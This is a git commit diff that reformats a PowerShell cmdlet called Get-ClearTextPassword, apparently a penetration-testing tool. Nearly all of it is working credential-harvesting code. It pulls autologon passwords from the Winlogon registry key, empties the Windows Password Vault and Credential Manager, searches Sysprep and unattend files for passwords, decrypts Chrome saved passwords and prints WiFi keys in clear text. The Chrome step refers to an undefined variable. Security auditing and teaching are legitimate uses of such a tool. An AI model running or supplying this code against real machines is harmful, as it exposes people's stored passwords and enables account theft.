f235f88fb3263ecac92a21e0ba8ad5a79d0ad775
tobor <rosborne@osbornepro.com>
2023-01-02 00:46:50 -0700

    Update Get-ClearTextPassword.ps1
    Updated to use my new formatting style

--- Get-ClearTextPassword.ps1
+++ Get-ClearTextPassword.ps1
@@ -1,3 +1,4 @@
+Function Get-ClearTextPassword {
 <#
 .SYNOPSIS
 This cmdlet is used to obtain clear text passwords from cached locations as well as the from the Windows Registry
@@ -41,8 +42,10 @@ Contact: rosborne@osbornepro.com
 .LINK
 https://osbornepro.com
 https://writeups.osbornepro.com
+https://encrypit.osbornepro.com
 https://btpssecpack.osbornepro.com
 https://github.com/tobor88
+https://github.com/OsbornePro
 https://gitlab.com/tobor88
 https://www.powershellgallery.com/profiles/tobor
 https://www.linkedin.com/in/roberthosborne/
@@ -56,9 +59,7 @@ None
 
 .OUTPUTS
 None
-
 #>
-Function Get-ClearTextPassword {
     [CmdletBinding(DefaultParameterSetName='All')]
         param (
             [Parameter(
@@ -103,53 +104,49 @@ Function Get-ClearTextPassword {
         )  # End param
 
 
-    If (($AutoLogon.IsPresent) -or ($PSCmdlet.ParameterSetName -eq 'All'))
-    {
+    If (($AutoLogon.IsPresent) -or ($PSCmdlet.ParameterSetName -eq 'All')) {
 
         $AutoLoginPassword = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | Select-Object -Property "DefaultUserName","DefaultPassword"
-        If (($AutoLoginPassword).DefaultPassword)
-        {
+        If (($AutoLoginPassword).DefaultPassword) {
 
-            Write-Host "Auto Login Credentials Found: " -ForegroundColor "Red"
-            Write-Host "$AutoLoginPassword" -ForegroundColor "Red"
+            Write-Output -InputObject "Auto Login Credentials Found: "
+            Write-Output -InputObject "$AutoLoginPassword"
 
         }  # End If
 
     }  # End If
 
+    If (($PasswordVault.IsPresent) -or ($PSCmdlet.ParameterSetName -eq 'All')) {
 
-    If (($PasswordVault.IsPresent) -or ($PSCmdlet.ParameterSetName -eq 'All'))
-    {
-
-        Write-Verbose "Checking for passwords in the Windows Password vault"
+        Write-Verbose -Message "Checking for passwords in the Windows Password vault"
         [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword();$_ }
 
     }  # End If
 
 
-    If (($CredentialManager.IsPresent) -or ($PSCmdlet.ParameterSetName -eq 'All'))
-    {
+    If (($CredentialManager.IsPresent) -or ($PSCmdlet.ParameterSetName -eq 'All')) {
 
         Write-Verbose "Checking Credential Manager for stored credentials"
 
         Install-Module -Name CredentialManager -Confirm:$True
         Import-Module -Name CredentialManager
-        Get-StoredCredential | ForEach-Object { Write-Host -NoNewLine $_.Username; Write-Host -NoNewLine ":" ; $P = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.Password) ; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($P); }
+        Get-StoredCredential | ForEach-Object { 
+        
+            $P = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.Password)
+            Write-Output -InputObject "$($_.Username):$([System.Runtime.InteropServices.Marshal]::PtrToStringAuto($P))"
+            
+        }  # End ForEach-Object
 
     }  # End If
 
 
-    If (($Sysprep.IsPresent) -or ($PSCmdlet.ParameterSetName -eq 'All'))
-    {
+    If (($Sysprep.IsPresent) -or ($PSCmdlet.ParameterSetName -eq 'All')) {
 
-        Write-Verbose "Checking for passwords in common Sysprep file locations"
-
+        Write-Verbose -Message "Checking for passwords in common Sysprep file locations"
         $PassFiles = "C:\Windows\sysprep\sysprep.xml","C:\Windows\sysprep\sysprep.inf","C:\Windows\sysprep.inf","C:\Windows\Panther\Unattended.xml","C:\Windows\Panther\Unattend.xml","C:\Windows\Panther\Unattend\Unattend.xml","C:\Windows\Panther\Unattend\Unattended.xml","C:\Windows\System32\Sysprep\unattend.xml","C:\Windows\System32\Sysprep\unattended.xml","C:\unattend.txt","C:\unattend.inf"
-        ForEach ($PassFile in $PassFiles)
-        {
+        ForEach ($PassFile in $PassFiles) {
 
-            If (Test-Path -Path $PassFile)
-            {
+            If (Test-Path -Path $PassFile) {
 
                 Get-Content -Path $PassFile | Select-String -Pattern "Password"
 
@@ -160,29 +157,26 @@ Function Get-ClearTextPassword {
     }  # End If
 
 
-    If (($Chrome.IsPresent) -or ($PSCmdlet.ParameterSetName -eq 'All'))
-    {
+    If (($Chrome.IsPresent) -or ($PSCmdlet.ParameterSetName -eq 'All')) {
 
-        Write-Verbose "Dumping passwords from Google Chrome"
+        Write-Verbose -Message "Dumping passwords from Google Chrome"
         [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($DataRow.password_value,$Null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser))
 
     }  # End If
 
 
-    If (($SNMP.IsPresent) -or ($PSCmdlet.ParameterSetName -eq 'All'))
-    {
+    If (($SNMP.IsPresent) -or ($PSCmdlet.ParameterSetName -eq 'All')) {
 
         Get-ChildItem -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SNMP" -Recurse
 
     }  # End If
 
 
-    If (($WiFi.IsPresent) -or ($PSCmdlet.ParameterSetName -eq 'All'))
-    {
+    If (($WiFi.IsPresent) -or ($PSCmdlet.ParameterSetName -eq 'All')) {
 
-        Write-Verbose "Dumping WiFi passwords"
+        Write-Verbose -Message "Dumping WiFi passwords"
         (netsh wlan show profiles) | Select-String -Pattern "\:(.+)$" | ForEach-Object {$Name = $_.Matches.Groups[1].Value.Trim(); $_ } | ForEach-Object {(netsh wlan show profile name="$Name" key=clear)} | Select-String -Pattern "Key Content\W+\:(.+)$" | ForEach-Object {$Pass=$_.Matches.Groups[1].Value.Trim(); $_ } | ForEach-Object {[PSCustomObject]@{ PROFILE_NAME=$Name;PASSWORD=$Pass }} | Format-Table -AutoSize
 
     }  # End If
 
-}  # End Function
+}  # End Function Get-ClearTextPassword
